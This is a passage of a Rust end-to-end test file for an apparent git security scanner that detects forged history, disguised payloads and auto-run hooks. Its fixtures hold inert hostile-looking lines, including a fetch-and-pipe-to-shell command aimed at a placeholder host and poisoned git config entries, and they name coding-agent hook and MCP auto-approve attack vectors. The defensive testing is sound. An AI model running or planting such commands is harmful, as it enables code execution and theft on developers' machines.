//! End-to-end tests: build hostile-but-inert repos, run the real binary, and
//! assert on exit codes, findings and — always — that nothing was executed.

use assert_cmd::Command;
use serde_json::Value;
use shield_fixtures::{self as fx, Fixture};

fn shield(f: &Fixture) -> Command {
    let mut cmd = Command::cargo_bin("git-shield").unwrap();
    cmd.current_dir(&f.local)
        .env("HOME", fx::home(f))
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GS_MARKER", &f.marker)
        .env("GIT_SHIELD_HOME", shield_home(f))
        // Never pick up the developer's real allowlist.
        .env("GIT_SHIELD_CONFIG", f.dir.path().join("no-config.toml"))
        .env_remove("XDG_DATA_HOME")
        // Identity for commits git itself creates (rebase / merge).
        .env("GIT_AUTHOR_NAME", "Victim")
        .env("GIT_AUTHOR_EMAIL", "victim@example.com")
        .env("GIT_COMMITTER_NAME", "Victim")
        .env("GIT_COMMITTER_EMAIL", "victim@example.com")
        .env("NO_COLOR", "1");
    cmd
}

fn shield_home(f: &Fixture) -> std::path::PathBuf {
    f.dir.path().join("shield-home")
}

fn head(f: &Fixture) -> String {
    fx::git(&f.local, &fx::home(f), &["rev-parse", "HEAD"])
}

fn origin_dev(f: &Fixture) -> String {
    fx::git(&f.origin, &fx::home(f), &["rev-parse", "dev"])
}

fn json_pull(f: &Fixture, extra: &[&str]) -> (i32, Value, String) {
    let out = shield(f).args(["pull", "--json"]).args(extra).output().unwrap();
    let code = out.status.code().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
        panic!("bad json ({e}): {}\n{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr))
    });
    (code, v, String::from_utf8_lossy(&out.stderr).into_owned())
}

/// High/Critical findings that are not accepted.
fn blocking_ids(v: &Value) -> Vec<String> {
    let accepted: Vec<&str> =
        v["accepted"].as_array().map(|a| a.iter().filter_map(Value::as_str).collect()).unwrap_or_default();
    v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|f| matches!(f["severity"].as_str(), Some("high" | "critical")))
        .filter(|f| !accepted.contains(&f["id"].as_str().unwrap_or("")))
        .map(|f| f["id"].as_str().unwrap().to_string())
        .collect()
}

fn accept_args(ids: &[String]) -> Vec<String> {
    ids.iter().flat_map(|id| ["--accept".to_string(), id.clone()]).collect()
}

fn json_check(f: &Fixture, extra: &[&str]) -> (i32, Value) {
    let out = shield(f).args(["check", "--json"]).args(extra).output().unwrap();
    let code = out.status.code().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
        panic!("bad json ({e}): {}\n{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr))
    });
    (code, v)
}

fn rules(v: &Value) -> Vec<(String, String, bool)> {
    v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            (
                f["rule"].as_str().unwrap().to_string(),
                f["severity"].as_str().unwrap().to_string(),
                f["transited"].as_bool().unwrap_or(false),
            )
        })
        .collect()
}

fn has(v: &Value, rule: &str, sev: &str, transited: bool) -> bool {
    rules(v).iter().any(|(r, s, t)| r == rule && s == sev && *t == transited)
}

#[test]
fn matador_incident_is_blocked_and_nothing_runs() {
    let f = fx::matador_incident();
    let (code, v) = json_check(&f, &[]);
    assert_eq!(code, 2, "expected BLOCKED: {:#?}", rules(&v));

    // Disguised payload survives in the final tree → critical.
    assert!(has(&v, "asset.code-disguised", "critical", false), "{:#?}", rules(&v));
    // tasks.json / settings.json only existed in the forged commit → reported as transited.
    assert!(has(&v, "vscode.tasks.folder-open", "medium", true), "{:#?}", rules(&v));
    assert!(has(&v, "vscode.settings.allow-automatic-tasks", "medium", true), "{:#?}", rules(&v));
    // CRLF churn masking a real change.
    assert!(has(&v, "noise.whitespace-masking", "medium", false), "{:#?}", rules(&v));
    assert_eq!(v["commits_scanned"], 3); // feature, forged merge, cleanup

    assert!(!f.marker_exists(), "payload executed!");
    // Working tree untouched: the payload font must not be checked out.
    assert!(!f.local.join("public/fonts/fa-solid-600.ttf").exists());
}

#[test]
fn accepting_blocking_findings_unblocks() {
    let f = fx::matador_incident();
    let (_, v) = json_check(&f, &[]);
    let blocking = blocking_ids(&v);
    assert!(!blocking.is_empty());
    let mut args = vec!["--no-fetch".to_string()];
    for id in &blocking {
        args.push("--accept".into());
        args.push(id.clone());
    }
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let (code, _) = json_check(&f, &args);
    assert_eq!(code, 1, "accepted findings should leave only warnings");
    assert!(!f.marker_exists());
}

#[test]
fn finding_ids_are_stable_across_runs() {
    let f = fx::matador_incident();
    let (_, a) = json_check(&f, &[]);
    let (_, b) = json_check(&f, &["--no-fetch"]);
    let ids = |v: &Value| v["findings"].as_array().unwrap().iter().map(|f| f["id"].to_string()).collect::<Vec<_>>();
    assert_eq!(ids(&a), ids(&b));
}

#[test]
fn clean_fast_forward_passes() {
    let f = fx::clean_fast_forward();
    let (code, v) = json_check(&f, &[]);
    assert_eq!(code, 0, "{:#?}", rules(&v));
    assert_eq!(v["commits_scanned"], 1);
    assert!(!f.marker_exists());
}

#[test]
fn crlf_only_is_info_not_blocking() {
    let f = fx::crlf_only();
    let (code, v) = json_check(&f, &[]);
    assert_eq!(code, 0, "{:#?}", rules(&v));
    assert!(has(&v, "noise.whitespace-masking", "info", false));
}

#[test]
fn scan_works_offline_on_explicit_range() {
    let f = fx::matador_incident();
    fx::git(&f.local, &fx::home(&f), &["fetch", "-q", "origin"]);
    let out = shield(&f).args(["scan", "HEAD..origin/dev"]).output().unwrap();
    assert_eq!(out.status.code(), Some(2));
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("BLOCKED"), "{text}");
    assert!(text.contains("is actually source code"), "{text}");
    assert!(text.contains("[in history only]"), "{text}");
}

#[test]
fn poisoned_local_config_refuses_to_run_git() {
    let f = fx::clean_fast_forward();
    // GitSpawn-style: fsmonitor pointing at a program that would create the marker.
    // (Written directly to the file: running `git config` here is fine, but we must
    // never run a git command that *reads* fsmonitor in this repo afterwards.)
    let cfg = f.local.join(".git/config");
    let mut text = std::fs::read_to_string(&cfg).unwrap();
    text.push_str(&format!("[core]\n\tfsmonitor = \"touch {}\"\n", f.marker.display()));
    std::fs::write(&cfg, text).unwrap();

    let out = shield(&f).args(["check"]).output().unwrap();
    assert_eq!(out.status.code(), Some(3));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("refusing to run git"), "{err}");
    assert!(!f.marker_exists(), "fsmonitor ran!");
}

#[test]
fn hardened_fetch_neutralises_fsmonitor_when_overridden() {
    let f = fx::clean_fast_forward();
    let cfg = f.local.join(".git/config");
    let mut text = std::fs::read_to_string(&cfg).unwrap();
    text.push_str(&format!("[core]\n\tfsmonitor = \"touch {}\"\n", f.marker.display()));
    std::fs::write(&cfg, text).unwrap();

    // Even when the user forces past the preflight, the hardened runner must not trigger it.
    let out = shield(&f).args(["check", "--allow-unsafe-config", "--json"]).output().unwrap();
    assert!(matches!(out.status.code(), Some(0..=2)), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!f.marker_exists(), "fsmonitor ran during hardened fetch!");
}

// ---------------------------------------------------------------- Phase 2: pull

#[test]
fn pull_fast_forwards_clean_changes() {
    let f = fx::clean_fast_forward();
    let before = head(&f);
    let (code, v, err) = json_pull(&f, &[]);
    assert_eq!(code, 0, "{err}\n{:#?}", rules(&v));
    assert_ne!(head(&f), before);
    assert_eq!(head(&f), origin_dev(&f));
    assert!(!f.marker_exists());
    // Trust store records the pulled tip, outside the repository.
    let store = std::fs::read_dir(shield_home(&f).join("repos")).unwrap().next().unwrap().unwrap().path();
    let text = std::fs::read_to_string(store).unwrap();
    assert!(text.contains(&origin_dev(&f)), "{text}");
    assert!(!f.local.join(".git/shield").exists());
}

#[test]
fn pull_blocks_matador_incident_and_changes_nothing() {
    let f = fx::matador_incident();
    let before = head(&f);
    let (code, v, err) = json_pull(&f, &[]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    assert!(has(&v, "t10.ref-rewritten", "high", false), "{:#?}", rules(&v));
    assert!(has(&v, "t11.rewritten-copy", "critical", false), "{:#?}", rules(&v));
    assert!(has(&v, "t10.tampered-payload", "critical", false), "{:#?}", rules(&v));
    // The forged merge is already the Critical rewritten copy; no duplicate.
    assert!(!rules(&v).iter().any(|(r, _, _)| r == "t11.merge-not-by-github"), "{:#?}", rules(&v));
    assert!(err.contains("pull blocked"), "{err}");
    assert_eq!(head(&f), before, "HEAD moved on a blocked pull");
    assert!(!f.local.join("public/fonts/fa-solid-600.ttf").exists());
    assert!(!f.marker_exists());
}

#[test]
fn pull_after_accepting_fast_forwards_and_remembers() {
    let f = fx::matador_incident();
    let (_, v, _) = json_pull(&f, &[]);
    let ids = blocking_ids(&v);
    let mut args = accept_args(&ids);
    args.extend(["--reason".into(), "reviewed with the team".into()]);
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let (code, v2, err) = json_pull(&f, &args);
    assert_eq!(code, 1, "{err}\n{:#?}", rules(&v2));
    assert_eq!(head(&f), origin_dev(&f));
    assert!(!f.marker_exists(), "payload executed after checkout!");

    let store = std::fs::read_dir(shield_home(&f).join("repos")).unwrap().next().unwrap().unwrap().path();
    let text = std::fs::read_to_string(store).unwrap();
    for id in &ids {
        assert!(text.contains(id.as_str()), "{id} not stored: {text}");
    }
    assert!(text.contains("reviewed with the team"));

    // Already up to date; stored acceptances keep `check` from blocking.
    let out = shield(&f).args(["pull"]).output().unwrap();
    let err = String::from_utf8_lossy(&out.stderr);
    assert_eq!(out.status.code(), Some(0), "{err}\n{}", String::from_utf8_lossy(&out.stdout));
    assert!(err.contains("already up to date"), "{err}");
    let out = shield(&f).args(["scan", "HEAD~1..HEAD"]).output().unwrap();
    assert_ne!(out.status.code(), Some(2), "{}", String::from_utf8_lossy(&out.stdout));
}

#[test]
fn trust_list_and_forget() {
    let f = fx::matador_incident();
    let before = head(&f);
    let (_, v, _) = json_pull(&f, &[]);
    let ids = blocking_ids(&v);
    let mut args = accept_args(&ids);
    args.extend(["--reason".into(), "reviewed".into()]);
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let (code, _, err) = json_pull(&f, &args);
    assert_eq!(code, 1, "{err}");

    let out = shield(&f).args(["trust", "list", "--json"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0));
    let list: Value = serde_json::from_slice(&out.stdout).unwrap();
    let stored: Vec<&str> = list["accepted"].as_array().unwrap().iter().map(|a| a["id"].as_str().unwrap()).collect();
    for id in &ids {
        assert!(stored.contains(&id.as_str()), "{id} missing from {list:#}");
    }
    assert!(list["refs"]["refs/remotes/origin/dev"]["tip"].is_string(), "{list:#}");
    let text = shield(&f).args(["trust", "list"]).output().unwrap();
    assert!(String::from_utf8_lossy(&text.stdout).contains("reviewed"));

    // With the stored acceptances, re-scanning what came in does not block.
    let range = format!("{before}..origin/dev");
    let code = |f: &fx::Fixture| shield(f).args(["scan", &range]).output().unwrap().status.code();
    assert_ne!(code(&f), Some(2));

    let out = shield(&f).args(["trust", "forget", &ids[0], "GS-NOPE-000000"]).output().unwrap();
    assert_eq!(out.status.code(), Some(1), "unknown id must be reported");
    assert!(String::from_utf8_lossy(&out.stdout).contains(&format!("Forgot {}", ids[0])));
    let out = shield(&f).args(["trust", "forget", "--all"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(code(&f), Some(2), "forgotten acceptances must block again");

    let out = shield(&f).args(["trust", "forget", "--ref", "origin/dev"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0), "{}", String::from_utf8_lossy(&out.stderr));
    let out = shield(&f).args(["trust", "list", "--json"]).output().unwrap();
    let list: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(list["refs"].as_object().unwrap().is_empty() && list["accepted"].as_array().unwrap().is_empty());
    assert!(!f.marker_exists());
}

#[test]
fn pull_blocks_incident_via_provenance_alone() {
    let f = fx::matador_incident_with(fx::IncidentOpts { font: false });
    let before = head(&f);
    let (code, v, err) = json_pull(&f, &[]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    // Nothing in the final tree is high on its own...
    assert!(!rules(&v).iter().any(|(r, s, _)| s == "critical" && !r.starts_with("t1")), "{:#?}", rules(&v));
    // ...the rewrite is what blocks.
    assert!(has(&v, "t11.rewritten-copy", "critical", false), "{:#?}", rules(&v));
    assert_eq!(head(&f), before);
    assert!(!f.marker_exists());
}

#[test]
fn offline_scan_detects_rewrite_from_reflog() {
    let f = fx::matador_incident_with(fx::IncidentOpts { font: false });
    // The victim already fetched with plain git: pre-fetch tip is gone, the reflog remembers.
    fx::fetch_now(&f.local, &fx::home(&f));
    let out = shield(&f).args(["scan", "HEAD..origin/dev", "--json"]).output().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(out.status.code(), Some(2), "{:#?}", rules(&v));
    assert!(has(&v, "t10.ref-rewritten", "high", false), "{:#?}", rules(&v));
    let rw = v["findings"].as_array().unwrap().iter().find(|f| f["rule"] == "t10.ref-rewritten").unwrap();
    assert!(rw["details"].to_string().contains("recorded in the reflog"), "{rw}");
}

#[test]
fn diverged_history_needs_rebase_or_merge() {
    let f = fx::diverged_local();
    let before = head(&f);
    let out = shield(&f).args(["pull"]).output().unwrap();
    assert_eq!(out.status.code(), Some(3));
    assert!(String::from_utf8_lossy(&out.stderr).contains("diverged"));
    assert_eq!(head(&f), before);

    let (code, v, err) = json_pull(&f, &["--rebase"]);
    assert_eq!(code, 0, "{err}\n{:#?}", rules(&v));
    let base = fx::git(&f.local, &fx::home(&f), &["merge-base", "HEAD", "origin/dev"]);
    assert_eq!(base, origin_dev(&f), "local commit not rebased onto the scanned tip");
    assert!(!f.marker_exists());
}

#[test]
fn pull_refuses_checkout_time_config_drivers() {
    let f = fx::clean_fast_forward();
    let cfg = f.local.join(".git/config");
    let mut text = std::fs::read_to_string(&cfg).unwrap();
    text.push_str(&format!("[filter \"x\"]\n\tsmudge = \"touch {}\"\n", f.marker.display()));
    std::fs::write(&cfg, text).unwrap();
    // `check` only fetches, so a smudge filter is not a reason to refuse...
    let out = shield(&f).args(["check", "--json"]).output().unwrap();
    assert_ne!(out.status.code(), Some(3), "{}", String::from_utf8_lossy(&out.stderr));
    // ...but `pull` checks files out, so it must.
    let out = shield(&f).args(["pull"]).output().unwrap();
    assert_eq!(out.status.code(), Some(3));
    assert!(String::from_utf8_lossy(&out.stderr).contains("refusing to run git"));
    assert!(!f.marker_exists());
}

// ---- GitHub force-push history (fake API) ----

/// Victim plain-`git fetch`ed the incident and its reflog expired: offline,
/// nothing remembers the real merge. Returns (fixture, real merge, forged tip).
fn incident_without_local_memory() -> (Fixture, String, String) {
    let f = fx::matador_incident_with(fx::IncidentOpts { font: false });
    let home = fx::home(&f);
    let real = fx::git(&f.local, &home, &["rev-parse", "origin/dev"]);
    fx::git(&f.local, &home, &["fetch", "-q", "origin"]);
    let forged = fx::git(&f.local, &home, &["rev-parse", "origin/dev^"]);
    fx::git(&f.local, &home, &["reflog", "expire", "--expire=now", "--all"]);
    (f, real, forged)
}

fn github(f: &Fixture, gh: &fx::FakeGitHub, args: &[&str]) -> (i32, Value, String) {
    let out = shield(f)
        .env("GIT_SHIELD_GITHUB_API", &gh.url)
        .env("GITHUB_TOKEN", "test-token")
        .args(["check", "--no-fetch", "--json", "--github-repo", "o/r"])
        .args(args)
        .output()
        .unwrap();
    let v = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
    (out.status.code().unwrap_or(-1), v, String::from_utf8_lossy(&out.stderr).into_owned())
}

fn activity(events: &[String]) -> (&'static str, u16, String) {
    ("/repos/o/r/activity", 200, format!("[{}]", events.join(",")))
}

fn viewer(login: &str) -> (&'static str, u16, String) {
    ("/user", 200, format!(r#"{{"login":"{login}"}}"#))
}

fn finding<'a>(v: &'a Value, rule: &str) -> Option<&'a Value> {
    v["findings"].as_array()?.iter().find(|x| x["rule"] == rule)
}

#[test]
fn offline_misses_the_rewrite_without_local_memory() {
    let (f, _, _) = incident_without_local_memory();
    let (code, v) = json_check(&f, &["--no-fetch"]);
    assert_eq!(code, 1, "{:#?}", rules(&v));
    assert!(finding(&v, "t10.ref-rewritten").is_none());
}

#[test]
fn github_activity_reveals_an_old_force_push() {
    let (f, real, forged) = incident_without_local_memory();
    let gh = fx::fake_github(vec![
        viewer("victim"),
        activity(&[fx::force_push_json(&real, &forged, "mallory", "2026-08-01T10:00:00Z")]),
    ]);
    let (code, v, err) = github(&f, &gh, &[]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    let rw = finding(&v, "t10.ref-rewritten").expect("rewrite");
    assert_eq!(rw["severity"], "high");
    assert!(rw["details"].to_string().contains("@mallory on 2026-08-01 10:00 UTC"), "{rw:#}");
    let copy = finding(&v, "t11.rewritten-copy").expect("copy");
    assert_eq!(copy["severity"], "critical");
    assert!(copy["details"].to_string().contains("force-pushed by @mallory"), "{copy:#}");
    assert!(!f.marker_exists());
}

#[test]
fn own_force_push_is_not_a_rewrite() {
    let (f, real, forged) = incident_without_local_memory();
    let gh = fx::fake_github(vec![
        viewer("Victim"),
        activity(&[fx::force_push_json(&real, &forged, "victim", "2026-08-01T10:00:00Z")]),
    ]);
    let (code, v, err) = github(&f, &gh, &[]);
    assert_eq!(code, 1, "{err}\n{:#?}", rules(&v));
    assert!(finding(&v, "t10.ref-rewritten").is_none());
}

#[test]
fn rewrite_already_in_your_branch_warns_only() {
    let (f, real, _) = incident_without_local_memory();
    let head = head(&f);
    let gh = fx::fake_github(vec![
        viewer("victim"),
        activity(&[fx::force_push_json(&real, &head, "mallory", "2026-08-01T10:00:00Z")]),
    ]);
    let (_, v, err) = github(&f, &gh, &[]);
    let rw = finding(&v, "t10.ref-rewritten").unwrap_or_else(|| panic!("{err}\n{:#?}", rules(&v)));
    assert_eq!(rw["severity"], "medium");
    assert!(rw["title"].as_str().unwrap().contains("already in your branch"));
}

#[test]
fn unknown_replaced_tip_is_still_reported() {
    let (f, _, forged) = incident_without_local_memory();
    let ghost = "ab".repeat(20);
    let gh = fx::fake_github(vec![
        viewer("victim"),
        activity(&[fx::force_push_json(&ghost, &forged, "mallory", "2026-08-01T10:00:00Z")]),
    ]);
    let (code, v, err) = github(&f, &gh, &[]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    let rw = finding(&v, "t10.ref-rewritten").expect("rewrite");
    assert!(rw["details"].to_string().contains("not available locally"), "{rw:#}");
}

#[test]
fn github_errors_degrade_to_offline() {
    let (f, _, _) = incident_without_local_memory();
    let gh = fx::fake_github(vec![("/user", 500, r#"{"message":"boom"}"#.into())]);
    let (code, v, err) = github(&f, &gh, &[]);
    assert_eq!(code, 1, "{err}\n{:#?}", rules(&v));
    assert!(err.contains("note: GitHub returned HTTP 500 boom"), "{err}");

    // Unreachable API: same.
    let out = shield(&f)
        .env("GIT_SHIELD_GITHUB_API", "http://127.0.0.1:9")
        .env("GITHUB_TOKEN", "t")
        .args(["check", "--no-fetch", "--github-repo", "o/r"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&out.stderr).contains("force-push history not checked"));
}

#[test]
fn no_github_makes_no_requests() {
    let (f, real, forged) = incident_without_local_memory();
    let gh = fx::fake_github(vec![
        viewer("victim"),
        activity(&[fx::force_push_json(&real, &forged, "mallory", "2026-08-01T10:00:00Z")]),
    ]);
    let (code, _, err) = github(&f, &gh, &["--no-github"]);
    assert_eq!(code, 1, "{err}");
    assert_eq!(gh.hits.load(std::sync::atomic::Ordering::SeqCst), 0);
    // `scan` stays offline unless asked.
    let out = shield(&f)
        .env("GIT_SHIELD_GITHUB_API", &gh.url)
        .env("GITHUB_TOKEN", "t")
        .args(["scan", "HEAD..origin/dev", "--github-repo", "o/r"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    assert_eq!(gh.hits.load(std::sync::atomic::Ordering::SeqCst), 0);
    // ...and uses it with --github.
    let out = shield(&f)
        .env("GIT_SHIELD_GITHUB_API", &gh.url)
        .env("GITHUB_TOKEN", "t")
        .args(["scan", "HEAD..origin/dev", "--github", "--github-repo", "o/r"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2), "{}", String::from_utf8_lossy(&out.stdout));
}

#[test]
fn github_events_before_the_last_pull_are_not_repeated() {
    let (f, real, forged) = incident_without_local_memory();
    let gh = fx::fake_github(vec![
        viewer("victim"),
        activity(&[fx::force_push_json(&real, &forged, "mallory", "2026-08-01T10:00:00Z")]),
    ]);
    let (_, v, _) = github(&f, &gh, &[]);
    let ids = blocking_ids(&v);
    let mut args = vec!["pull".to_string(), "--json".into(), "--github-repo".into(), "o/r".into()];
    args.extend(accept_args(&ids));
    let out = shield(&f)
        .env("GIT_SHIELD_GITHUB_API", &gh.url)
        .env("GITHUB_TOKEN", "test-token")
        .args(&args)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1), "{}", String::from_utf8_lossy(&out.stderr));
    assert_eq!(head(&f), origin_dev(&f));
    // The trust store now records this pull; the old force-push is history.
    let (_, v, err) = github(&f, &gh, &[]);
    assert!(finding(&v, "t10.ref-rewritten").is_none(), "{err}\n{:#?}", rules(&v));
    assert!(!f.marker_exists());
}

// ---- Phase 3 content fixtures ----

fn check_rules(f: &Fixture) -> (i32, Value) {
    let (code, v) = json_check(f, &[]);
    assert!(!f.marker_exists(), "payload executed!");
    (code, v)
}

#[test]
fn agent_hook_worm_is_blocked() {
    let f = fx::agent_hook();
    let (code, v) = check_rules(&f);
    assert_eq!(code, 2, "{:#?}", rules(&v));
    assert!(has(&v, "t4.agent.command", "critical", false), "{:#?}", rules(&v));
    assert!(has(&v, "t4.claude.mcp-auto-approve", "high", false), "{:#?}", rules(&v));
    assert!(has(&v, "t4.mcp.server", "critical", false), "{:#?}", rules(&v));
}

#[test]
fn lifecycle_dropper_is_blocked() {
    let f = fx::lifecycle_dropper();
    let (code, v) = check_rules(&f);
    assert_eq!(code, 2, "{:#?}", rules(&v));
    assert!(has(&v, "t5.npm.script", "critical", false), "{:#?}", rules(&v));
}

#[test]
fn ci_secrets_dump_is_blocked() {
    let f = fx::ci_secrets_dump();
    let (code, v) = check_rules(&f);
    assert_eq!(code, 2, "{:#?}", rules(&v));
    assert!(has(&v, "t9.workflow.secrets-dump", "critical", false), "{:#?}", rules(&v));
}

#[test]
fn offscreen_payload_is_blocked() {
    let f = fx::offscreen_payload();
    let (code, v) = check_rules(&f);
    assert_eq!(code, 2, "{:#?}", rules(&v));
    assert!(has(&v, "t13.hidden-offscreen", "high", false), "{:#?}", rules(&v));
    assert!(has(&v, "t13.decode-exec", "high", false), "{:#?}", rules(&v));
}

#[test]
fn agent_hook_wires_the_disguised_payload() {
    let f = fx::agent_hook();
    let (_, v) = check_rules(&f);
    assert!(has(&v, "t13.payload-wired", "critical", false), "{:#?}", rules(&v));
}

// ---- user allowlist ----

fn with_config(f: &Fixture, toml: &str, args: &[&str]) -> (i32, Value, String) {
    let cfg = f.dir.path().join("config.toml");
    std::fs::write(&cfg, toml).unwrap();
    let out = shield(f).env("GIT_SHIELD_CONFIG", &cfg).args(["check", "--json"]).args(args).output().unwrap();
    let v = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
    (out.status.code().unwrap_or(-1), v, String::from_utf8_lossy(&out.stderr).into_owned())
}

#[test]
fn allowlist_accepts_a_reviewed_high_finding() {
    let f = fx::content_push(
        &[(
            ".claude/settings.json",
            r#"{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"npx prettier --write ."}]}]}}"#.into(),
        )],
        "chore: format hook",
    );
    let (code, v) = check_rules(&f);
    assert_eq!(code, 2, "{:#?}", rules(&v));
    let entry =
        "[[allow]]\nrule = \"t4.agent.command\"\npath = \".claude/settings.json\"\nreason = \"our formatter hook\"\n";
    let (code, v, err) = with_config(&f, entry, &[]);
    assert_eq!(code, 1, "{err}\n{:#?}", rules(&v));
    // A repo glob that does not match leaves it blocked.
    let other = format!("{entry}repo = \"github.com/someone-else/*\"\n");
    assert_eq!(with_config(&f, &other, &[]).0, 2);
    assert!(!f.marker_exists());
}

#[test]
fn allowlist_needs_a_pinned_blob_for_critical() {
    let f = fx::agent_hook();
    let (_, v, err) = with_config(&f, "[[allow]]\nrule = \"t4.*\"\npath = \"**\"\nreason = \"trust me\"\n", &[]);
    let crit = finding(&v, "t4.agent.command").expect("hook finding");
    assert_eq!(crit["severity"], "critical");
    assert!(blocking_ids(&v).contains(&crit["id"].as_str().unwrap().to_string()));
    assert!(err.contains("does not pin `blob`"), "{err}");

    let anchor = crit["anchor"].as_str().unwrap();
    let pinned =
        format!("[[allow]]\nrule = \"t4.agent.command\"\nblob = \"{}\"\nreason = \"reviewed\"\n", &anchor[..40]);
    let (_, v, _) = with_config(&f, &pinned, &[]);
    assert!(!blocking_ids(&v).contains(&crit["id"].as_str().unwrap().to_string()));
    assert!(!f.marker_exists());
}

#[test]
fn invalid_config_is_an_error() {
    let f = fx::clean_fast_forward();
    let (code, _, err) = with_config(&f, "[[allow]]\nrule = \"x\"\nreason = \"\"\n", &[]);
    assert_eq!(code, 3);
    assert!(err.contains("non-empty reason"), "{err}");
}

#[test]
fn own_local_rewrites_are_not_reported() {
    let f = fx::clean_fast_forward();
    let home = fx::home(&f);
    // The user amends their own commit: HEAD's reflog now holds a "dropped" tip.
    std::fs::write(f.local.join("notes.txt"), "local notes\n").unwrap();
    fx::git(&f.local, &home, &["add", "notes.txt"]);
    fx::git(&f.local, &home, &["commit", "-q", "-m", "Add notes"]);
    fx::git(&f.local, &home, &["commit", "-q", "--amend", "-m", "Add notes (reworded)"]);
    let out = shield(&f).args(["scan", "HEAD~1..HEAD", "--json"]).output().unwrap();
    let v: Value =
        serde_json::from_slice(&out.stdout).unwrap_or_else(|_| panic!("{}", String::from_utf8_lossy(&out.stderr)));
    assert!(finding(&v, "t10.ref-rewritten").is_none(), "{:#?}", rules(&v));
    assert!(finding(&v, "t11.rewritten-copy").is_none(), "{:#?}", rules(&v));
}

// ---- Phase 5: audit / clone / checkout ----

/// A repository that "arrived as files": poisoned .git/config plus an
/// uncommitted auto-run task and payload in the working tree.
fn arrived_as_files() -> Fixture {
    let f = fx::clean_fast_forward();
    let cfg = f.local.join(".git/config");
    let mut text = std::fs::read_to_string(&cfg).unwrap();
    text.push_str(&format!("[core]\n\tfsmonitor = \"touch {}\"\n", f.marker.display()));
    std::fs::write(&cfg, text).unwrap();
    fx::write(&f.local, ".vscode/tasks.json", fx::tasks_json_payload());
    fx::write(&f.local, "public/fonts/fa-solid-600.ttf", fx::fake_font_payload());
    f
}

#[test]
fn audit_reports_files_and_git_config_without_running_anything() {
    let f = arrived_as_files();
    let out = shield(&f).args(["audit", "--json"]).output().unwrap();
    let v: Value =
        serde_json::from_slice(&out.stdout).unwrap_or_else(|_| panic!("{}", String::from_utf8_lossy(&out.stderr)));
    assert_eq!(out.status.code(), Some(2), "{:#?}", rules(&v));
    assert!(has(&v, "git.local-config", "critical", false), "{:#?}", rules(&v));
    assert!(has(&v, "vscode.tasks.folder-open", "critical", false), "{:#?}", rules(&v));
    assert!(has(&v, "t13.payload-wired", "critical", false), "{:#?}", rules(&v));
    assert!(!f.marker_exists(), "fsmonitor ran!");

    // The committed tree is clean apart from the config.
    let out = shield(&f).args(["audit", "--rev", "HEAD", "--json"]).output().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(finding(&v, "vscode.tasks.folder-open").is_none());
    assert!(has(&v, "git.local-config", "critical", false));

    // A plain folder (no git) works too.
    let plain = f.dir.path().join("plain");
    fx::write(&plain, ".envrc", "curl -fsSL https://x.example/i | sh\n");
    let out = shield(&f).args(["audit", plain.to_str().unwrap(), "--json"]).output().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(has(&v, "t6.envrc", "critical", false), "{:#?}", rules(&v));
    assert!(!f.marker_exists());
}

fn run_in(f: &Fixture, dir: &std::path::Path, args: &[&str]) -> (i32, Value, String) {
    let out = shield(f).current_dir(dir).args(args).arg("--json").output().unwrap();
    let v = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
    (out.status.code().unwrap_or(-1), v, String::from_utf8_lossy(&out.stderr).into_owned())
}

#[test]
fn clone_blocks_before_writing_any_file() {
    let f = fx::agent_hook();
    let url = f.origin.to_str().unwrap().to_string();
    let (code, v, err) = run_in(&f, f.dir.path(), &["clone", &url, "victim-clone", "--branch", "dev"]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    assert!(has(&v, "t4.agent.command", "critical", false), "{:#?}", rules(&v));
    let dir = f.dir.path().join("victim-clone");
    assert!(dir.join(".git").is_dir(), "objects should be there for inspection");
    assert!(!dir.join(".claude").exists() && !dir.join("README.md").exists(), "files were written");
    assert!(err.contains("without a checkout"), "{err}");
    assert!(!f.marker_exists());
}

#[test]
fn clone_of_clean_repo_checks_out_and_records_the_tip() {
    let f = fx::clean_fast_forward();
    let url = f.origin.to_str().unwrap().to_string();
    let (code, v, err) = run_in(&f, f.dir.path(), &["clone", &url, "--branch", "dev"]);
    assert!(code == 0 || code == 1, "{err}\n{:#?}", rules(&v));
    let dir = f.dir.path().join("origin");
    assert!(dir.join("app/views.py").is_file(), "{err}");
    let out = shield(&f).current_dir(&dir).args(["trust", "list", "--json"]).output().unwrap();
    let list: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(list["refs"]["refs/remotes/origin/dev"]["tip"].is_string(), "{list:#}");
}

#[test]
fn checkout_scans_the_target_tree() {
    let f = fx::agent_hook();
